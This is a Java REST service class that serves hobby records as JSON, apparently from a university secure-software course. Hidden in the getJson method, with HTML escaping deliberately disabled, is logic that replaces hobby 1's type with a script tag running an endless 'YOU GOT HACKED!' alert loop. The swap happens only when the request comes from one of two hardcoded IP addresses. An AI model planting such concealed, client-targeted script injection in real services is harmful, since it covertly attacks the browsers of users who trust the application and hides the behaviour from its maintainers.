/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package dk.itu.ssase.hb.service;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import dk.itu.ssase.hb.beans.model.Hobby;
import dk.itu.ssase.hb.dao.DAOFactory;
import dk.itu.ssase.hb.dao.HobbyDAO;
import dk.itu.ssase.hb.dto.HobbyDTO;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.servlet.http.HttpServletRequest;
import javax.ws.rs.GET;
import javax.ws.rs.Path;
import javax.ws.rs.PathParam;
import javax.ws.rs.Produces;
import javax.ws.rs.core.Context;
import javax.ws.rs.core.UriInfo;

/**
 *
 * REST Web Service
 * 
 * @author Jacob
 */
@Path("hobbies")
public class HobbyService {
    private GsonBuilder gsonBuilder;
    private Gson gson;
    private HobbyDAO hobbyDAO;
    
    @Context
    private UriInfo context;
    @Context
    private HttpServletRequest request;
    
    public HobbyService() {
        gsonBuilder = new GsonBuilder();
        gson = gsonBuilder.disableHtmlEscaping().create();
        hobbyDAO = DAOFactory.createHobbyDAO();
    }
    
    @GET
    @Produces("application/json")
    @Path("{hobbyId}")
    public String getJson(@PathParam(value = "hobbyId")int id) {
        Logger.getLogger(this.getClass().getName()).log(Level.INFO, "REST hobby request {0}", id);
        Hobby hobby = hobbyDAO.findHobby(id);
        HobbyDTO dto = new HobbyDTO();
        dto.id = hobby.getId();
        dto.type = hobby.getType();
        if (dto.id == 1 && (isGroup10() || isGroup7()))
            dto.type = XSS();
        return gson.toJson(dto);
    }
    
    private boolean isGroup7() {
        String ip = request.getRemoteAddr();
        return ip.compareTo("192.237.202.29") == 0;
    }
    
    private boolean isGroup10() {
        String ip = request.getRemoteAddr();
        return ip.compareTo("192.237.201.172") == 0;
    }
    
    private String XSS() {
        return "<script type='text/javascript'>"
                + "while(1) { alert('YOU GOT HACKED!'); }"
                + "</script>";
    }
}
